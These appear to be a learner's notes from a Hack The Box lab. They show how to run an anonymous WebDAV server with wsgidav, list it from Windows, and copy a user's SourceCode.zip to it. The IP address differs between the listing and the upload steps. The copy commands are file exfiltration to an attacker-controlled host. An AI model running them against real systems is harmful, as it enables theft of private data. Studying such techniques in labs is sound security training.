![[Pasted image 20260430151936.png]]
## Installing WebDav Python modules

```Shell
3kjS@htb[/htb]$ sudo pip3 install wsgidav cheroot
```

## Using the WebDav Python module

```Shell
3kjS@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

## Connecting to the Webdav Share

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot 
Volume in drive \\192.168.49.128\DavWWWRoot has no label. 
Volume Serial Number is 0000-0000 

Directory of \\192.168.49.128\DavWWWRoot 

05/18/2022 10:05 AM <DIR> . 
05/18/2022 10:05 AM <DIR> .. 
05/18/2022 10:05 AM <DIR> sharefolder 
05/18/2022 10:05 AM 13 filetest.txt 
				1 File(s) 13 bytes 
				3 Dir(s) 43,443,318,784 bytes free
```
## Uploading Files using SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ 
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
